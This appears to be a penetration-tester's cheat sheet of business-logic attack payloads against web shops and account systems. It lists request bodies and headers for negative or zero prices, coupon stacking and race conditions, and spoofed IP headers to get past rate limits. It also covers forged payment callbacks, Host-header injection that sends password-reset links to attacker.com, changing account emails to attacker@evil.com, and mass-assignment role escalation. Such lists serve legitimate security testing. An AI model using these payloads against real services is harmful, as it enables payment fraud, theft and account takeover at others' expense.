# Business Logic Attack Payloads

> Source: Custom — security research and common vulnerability patterns

## Price / Quantity Manipulation

### Negative Values

```
# Change quantity to negative
POST /api/cart/update
{"item_id": 123, "quantity": -1, "price": 99.99}

# Negative price (if client-controlled)
POST /api/order
{"item_id": 123, "quantity": 1, "price": -50.00}

# Integer overflow
{"quantity": 2147483647}
{"quantity": 99999999999}

# Zero amount
{"amount": 0}
{"amount": 0.00}
{"amount": 0.001}
```

### Floating Point Abuse

```
# Rounding errors
{"amount": 0.004}    -> may round to 0, but credit applied
{"amount": 0.001}    -> repeated micro-transactions

# Currency confusion
{"amount": 100, "currency": "JPY"}    -> expecting USD
```

## Coupon / Discount Abuse

```
# Apply coupon multiple times
POST /api/apply-coupon  (send repeatedly via race condition)
{"code": "SAVE50"}

# Coupon stacking
POST /api/apply-coupon
{"codes": ["SAVE20", "SAVE30", "FREESHIP"]}

# Expired coupon reuse (modify date/time headers)
POST /api/apply-coupon
{"code": "EXPIRED2024", "timestamp": "2024-01-01T00:00:00Z"}

# Coupon for different product applied to another
POST /api/apply-coupon
{"code": "PREMIUM_DISCOUNT", "item_id": 456}
```

## Rate Limit Bypass

```
# IP rotation headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# Case variation
POST /api/login
POST /Api/Login
POST /API/LOGIN
POST /api/login/
POST /api/login?dummy=1

# HTTP method switch
GET /api/login?user=admin&pass=test
PUT /api/login (instead of POST)

# Parameter pollution
POST /api/login
user=admin&user=admin&pass=test
```

## Payment Flow Bypass

```
# Skip payment step — jump directly to confirmation
POST /api/order/confirm
{"order_id": 123, "status": "paid"}

# Modify payment amount after checkout
# Intercept and change amount between cart total and payment gateway

# Swap payment callback
POST /api/payment/callback
{"order_id": 123, "status": "success", "amount": 0.01}

# Currency mismatch
{"amount": 1, "currency": "IDR"}  -> 1 IDR instead of 1 USD

# Use test/sandbox payment credentials in production
```

## Account Takeover Chains

```
# Password reset flow abuse
1. Request reset for victim@target.com
2. Intercept reset token
3. Host header injection: Host: attacker.com (reset link sent to attacker domain)

# Email change without re-authentication
POST /api/account/email
{"new_email": "attacker@evil.com"}

# Phone number change -> SMS-based 2FA bypass
POST /api/account/phone
{"phone": "+1234567890"}

# OAuth linking to attacker account
POST /api/account/link-oauth
{"provider": "google", "token": "ATTACKER_OAUTH_TOKEN"}
```

## Privilege Escalation via Mass Assignment

```json
// Add admin field to registration
POST /api/register
{"username": "attacker", "password": "test", "role": "admin"}

// Modify role during profile update
PUT /api/profile
{"name": "Attacker", "email": "a@b.com", "isAdmin": true}

// Hidden parameter pollution
PUT /api/profile
{"name": "Attacker", "role_id": 1, "group": "administrators"}
```

## Workflow / State Bypass

```
# Skip steps in multi-step process
Step 1: /api/order/cart       -> skip
Step 2: /api/order/shipping   -> skip
Step 3: /api/order/payment    -> skip
Step 4: /api/order/confirm    -> call directly

# Re-use expired sessions/tokens
Authorization: Bearer <expired_jwt>

# Replay successful transaction
Capture and replay POST /api/transfer with same parameters

# Modify order after payment
PUT /api/order/123
{"items": [{"id": 999, "quantity": 10}], "total": 0.01}
```

## Feature Abuse

```
# Referral system abuse
- Self-referral via multiple accounts
- Referral code brute-force
- Referral with disposable emails

# Free trial abuse
- Account recreation with new email
- Time manipulation via system clock headers

# Gift card / credit system
- Transfer credits between self-owned accounts
- Negative transfer to increase balance
- Race condition on redemption
```

## Testing Checklist

```
1. Can I change the price/quantity to negative or zero?
2. Can I apply discounts/coupons multiple times?
3. Can I skip steps in a multi-step workflow?
4. Can I access another user's resources by changing IDs?
5. Can I modify my role/permissions via hidden parameters?
6. Are rate limits enforced consistently across all endpoints?
7. Can I replay transactions?
8. Does the payment callback validate the amount?
9. Can I change email/phone without re-authentication?
10. Are there race conditions on balance/limit operations?
```
